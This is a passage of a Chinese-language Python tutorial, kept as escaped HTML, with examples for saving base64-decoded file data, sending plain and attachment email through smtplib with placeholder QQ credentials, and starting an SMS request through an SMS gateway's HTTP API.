&lt;&#x2F;span&gt;&lt;span&gt;    filedata=my_dict[&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;filedata&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;].&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;with &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&#x2F;Users&#x2F;Hao&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;+filename,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;wb&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;f:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#将base64的数据解码成二进制些人文件&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        f.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;write&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;b64decode&lt;&#x2F;span&gt;&lt;span&gt;(filedata))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;图片已经保存&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__==&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;__main__&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;UDP套接字&lt;&#x2F;p&gt;
&lt;p&gt;通过UDP套接字实现电子邮件发送&lt;&#x2F;p&gt;
&lt;p&gt;发送电子邮件的时候要用smtp，smtp基于tcp，端口号25&lt;&#x2F;p&gt;
&lt;p&gt;接收邮件 POP3 &lt;&#x2F;p&gt;
&lt;p&gt;smtp规定了邮件发送者和发送邮件的服务器进行通信的细节&lt;&#x2F;p&gt;
&lt;p&gt;Python通过 smtplib来实现smtp操作&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;smtplib &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;SMTP&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;email.header &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;Header&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;email.mime.text &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;MIMEText&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    sender=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;xxx@qq.com&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    receivers=[&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;xxx@gmail.com&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;xxx@qq.com&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;]&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    message=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;MIMEText&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;用Python发送邮件示例代码&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;plain&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    message[&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;From&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;]=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Header&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;小明&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    message[&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;To&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;]=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Header&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;小红&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    message[&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Subject&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;]=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Header&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;示例代码邮件&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    smtper=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;SMTP&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;smtp.qq.com&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    smtper.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;login&lt;&#x2F;span&gt;&lt;span&gt;(sender,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;qq邮箱授权码&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    smtper.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;sendmail&lt;&#x2F;span&gt;&lt;span&gt;(sender,receivers,message.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;as_string&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;邮件发送完成&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__==&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;__main__&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;发送带有附件的邮件&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;smtplib &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;SMTP&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;email.header &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;Header&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;email.mime.text &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;MIMEText&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;email.mime.image &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;MIMEImage&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;email.mime.multipart &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;MIMEMultipart&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#创建一个带附件的邮件消息对象&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    message=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;MIMEMultipart&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    text_content=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;MIMEText&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;带附件的测试邮件&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;plain&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    message[&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Subject&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;]=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Header&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;测试邮件邮件&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#将文本内容添加到消息对象中&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    message.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;attach&lt;&#x2F;span&gt;&lt;span&gt;(text_content)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#将文件作为附件添加到消息对象中&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;with &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&#x2F;Users&#x2F;numb&#x2F;test.txt&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;rb&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;f:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        txt=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;MIMEText&lt;&#x2F;span&gt;&lt;span&gt;(f.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;read&lt;&#x2F;span&gt;&lt;span&gt;(),&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;plain&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        txt[&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Content-Type&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;]=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;text&#x2F;plain&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        txt[&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Content-Dispositon&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;]=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;attachment;filename=test.txt&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        message.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;attach&lt;&#x2F;span&gt;&lt;span&gt;(txt)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    sender=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;xxx@qq.com&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    receivers=[&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;xxx@qq.com&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;xxx@qq.com&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;]&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    smtper=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;SMTP&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;smtp.qq.com&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    smtper.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;login&lt;&#x2F;span&gt;&lt;span&gt;(sender,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;邮箱授权码&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    smtper.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;sendmail&lt;&#x2F;span&gt;&lt;span&gt;(sender,receivers,message.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;as_string&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    smtper.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;quit&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;邮件发送完成&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__==&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;__main__&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;发送短信&lt;&#x2F;p&gt;
&lt;p&gt;先注册短信平台，互亿无线&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;urllib.parse&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;http.client&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;json&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    host=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;106.ihuyi.com&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    sms_send_uri = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&#x2F;webservice&#x2F;sms.php?method=Submit&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    params = urllib.parse.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;urlencode&lt;&#x2F;span&gt;&lt;span&gt;({&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;account&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;:&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;xxx&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;password&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;:&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;xxx&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;content&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;:&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;丽哥你好，我是黄卓然。您的验证码是：123456。请不要把验证码泄露给其他人。&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;mobile&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;:&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;手机号码&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;format&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;:&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;json&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;})&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(params)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    headers={&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Content-Type&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;:&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;application&#x2F;x-www-form-urlencoded&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Accept&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;text&#x2F;plain&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;}&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    conn = http.client.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;HTTPConnection&lt;&#x2F;span&gt;&lt;span&gt;(host, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;port&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;80&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;timeout&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;30&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    conn.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;request&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;POST&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, sms_send_uri, params, headers)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    response = conn.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;getresponse&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
